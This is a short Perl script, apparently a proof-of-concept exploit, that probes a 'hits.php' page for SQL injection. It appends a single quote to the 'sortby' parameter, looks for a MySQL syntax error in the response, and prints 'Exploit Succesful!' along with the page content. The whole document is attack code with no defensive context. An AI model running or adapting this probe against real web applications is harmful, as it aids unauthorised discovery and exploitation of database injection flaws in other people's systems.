use HTTP::Request;
use LWP::UserAgent;

my $web="http://localhost/hits.php?sortby=1'";
my $ua=LWP::UserAgent->new();
my $respuesta=HTTP::Request->new(GET=>$web);
$ua->timeout(30);
my $response=$ua->request($respuesta);
$contenido=$response->content;
if ($response->is_success)
{
if($contenido =~ /You have an error in your SQL syntax;/)
{
print "\n[+] Exploit Succesful!\n";
print "\n[+] Content:\n";
print "$contenido\n\n";
}
}
else
{
print "\n[-] Exploit Failed!\n\n";
}